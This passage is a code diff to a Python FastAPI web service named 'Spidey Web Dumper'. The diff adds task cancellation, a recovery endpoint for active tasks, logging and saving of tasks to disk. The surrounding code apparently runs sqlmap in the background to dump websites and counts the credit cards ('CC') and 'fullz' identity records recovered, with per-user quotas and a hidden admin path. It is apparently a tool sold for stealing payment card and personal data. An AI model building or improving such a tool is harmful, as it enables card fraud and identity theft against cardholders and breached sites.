                 consume_quota(uid, "fullz", len(rich))
+        
         consume_quota(uid, "dumps", len(urls))
         save_last_response(uid, "dump", {
-            "tested": len(urls), "cards": result.get("cards", 0), "fullz": result.get("fullz", 0),
-            "cards_file": result.get("cards_file", ""), "fullz_file": result.get("fullz_file", ""),
+            "tested": len(urls), "cards": result.get("cards", 0), 
+            "fullz": result.get("fullz", 0),
+            "cards_file": result.get("cards_file", ""), 
+            "fullz_file": result.get("fullz_file", ""),
         })
+        
         update_task(tid, status="done", result=result)
         update_progress(tid, done=len(urls), total=len(urls),
-                        cards=result.get("cards", 0), fullz=result.get("fullz", 0), msg="Done!")
+                        cards=result.get("cards", 0), fullz=result.get("fullz", 0),
+                        msg="✅ Done!")
+        add_log(tid, f"✅ Dump complete: CC {result.get('cards',0)}, Fullz {result.get('fullz',0)}")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[dump] {e}")
         update_task(tid, status="error", error=str(e))
-
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — TASK STATUS
+#  API — TASK STATUS & CANCEL
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/api/task/{tid}")
 async def api_task_status(request: Request, tid: str):
@@ -1323,9 +1531,35 @@ async def api_task_cancel(request: Request, tid: str):
     t = get_task(tid)
     if not t or t["uid"] != uid:
         raise HTTPException(status_code=404, detail="Task not found")
-    update_task(tid, status="cancelled")
-    return {"ok": True}
+    
+    update_task(tid, status="cancelled", error="Cancelled by user")
+    update_progress(tid, msg="⛔ Cancelled by user")
+    add_log(tid, "⛔ Cancelled by user")
+    logger.info(f"[cancel] Task {tid} cancelled by {uid}")
+    return {"ok": True, "message": "Task cancelled"}
 
+
+@app.get("/api/tasks/active")
+async def api_tasks_active(request: Request):
+    """Page refresh ke baad active task wapas dhoondho"""
+    uid = require_user(request)
+    for tid, t in sorted(TASKS.items(), key=lambda x: x[1]["started"], reverse=True):
+        if t["uid"] == uid and t["status"] in ("starting", "running"):
+            return {"task_id": tid, "task": t}
+    return {"task_id": None}
+
+
+@app.get("/api/tasks/recent")
+async def api_tasks_recent(request: Request):
+    """Recent tasks list"""
+    uid = require_user(request)
+    user_tasks = [
+        {"id": t["id"], "type": t["type"], "status": t["status"], 
+         "started": t["started"], "progress": t["progress"]}
+        for t in TASKS.values() if t["uid"] == uid
+    ]
+    user_tasks.sort(key=lambda x: x["started"], reverse=True)
+    return {"tasks": user_tasks[:20]}
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  DOWNLOAD / FILES
@@ -1360,7 +1594,6 @@ async def api_files_delete(request: Request, fname: str = Form(...)):
             return JSONResponse({"error": str(e)}, status_code=500)
     return JSONResponse({"error": "Not found"}, status_code=404)
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  SETTINGS
 # ═══════════════════════════════════════════════════════════════════════════
@@ -1379,9 +1612,8 @@ async def api_settings_password(request: Request, old_password: str = Form(...),
     save_users(users)
     return {"ok": True}
 
-
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — ADMIN (with hidden ADMIN_PATH)
+#  ROUTES — ADMIN
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get(ADMIN_PATH, response_class=HTMLResponse)
 async def admin_panel(request: Request):
@@ -1541,7 +1773,6 @@ async def admin_stats(request: Request):
     }
     return render("admin_stats.html", {"request": request, "uid": uid, "stats": stats})
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  STARTUP / SHUTDOWN
 # ═══════════════════════════════════════════════════════════════════════════
@@ -1552,19 +1783,25 @@ async def on_startup():
     logger.info(f"📁 Output dir: {OUTPUT_DIR}")
     logger.info(f"🛡️  Security: {len(ALLOWED_IPS)} IPs whitelisted" if ALLOWED_IPS else "🛡️  No IP whitelist")
     logger.info(f"🛡️  Admin path: {ADMIN_PATH}")
+    
     load_users()
     load_keys()
+    load_tasks_from_disk()  # ✅ Load tasks
+    
     try:
         from core.sqlmap_api import ensure_api_server
         asyncio.create_task(ensure_api_server())
         logger.info("🔧 sqlmapapi starting in background...")
     except Exception as e:
         logger.warning(f"sqlmapapi start failed: {e}")
+    
     async def _cleaner():
         while True:
             await asyncio.sleep(600)
-            try: cleanup_old_tasks(max_age_hours=6)
-            except Exception: pass
+            try: 
+                cleanup_old_tasks(max_age_hours=24)
+            except Exception: 
+                pass
     asyncio.create_task(_cleaner())
     logger.info("✅ Spidey Web Dumper ready")
 
@@ -1572,6 +1809,10 @@ async def on_startup():
 @app.on_event("shutdown")
 async def on_shutdown():
     logger.info("🕷️  Spidey shutting down...")
+    try:
+        save_tasks_to_disk()
+    except Exception:
+        pass
     try:
         from core.sqlmap_api import stop_api_server
         stop_api_server()
@@ -1589,8 +1830,3 @@ if __name__ == "__main__":
     host = os.environ.get("HOST", "0.0.0.0")
     logger.info(f"🚀 Starting on {host}:{port}")
     uvicorn.run("web.main:app", host=host, port=port, reload=False, log_level="info")
-    
-    
-    
-    
-    
